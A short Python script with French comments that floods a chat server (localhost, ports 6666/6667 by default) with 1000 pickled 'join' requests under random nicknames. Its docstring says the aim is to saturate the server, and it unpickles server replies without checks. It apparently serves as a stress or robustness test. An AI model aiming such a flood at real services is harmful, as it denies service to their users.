import pickle
import time
import random
import string
from base_client import BaseClient

def random_nick():
    """Génère un pseudo aléatoire"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def flood_server(host="localhost", send_port=6666, broadcast_port=6667, count=1000, delay=0.01):
    """Envoie massivement des requêtes 'join' pour saturer le serveur"""
    client = BaseClient(host, send_port, broadcast_port)

    for _ in range(count):
        nick = random_nick()
        frame = {"type": "join", "nick": nick}
        packet = pickle.dumps(frame)
        
        response = client.send(packet)
        print(f"Tried to join with {nick}, response: {pickle.loads(response)}")
        
        time.sleep(delay)  # Petit délai pour éviter un crash du script
    
    client.close()

if __name__ == "__main__":
    flood_server()
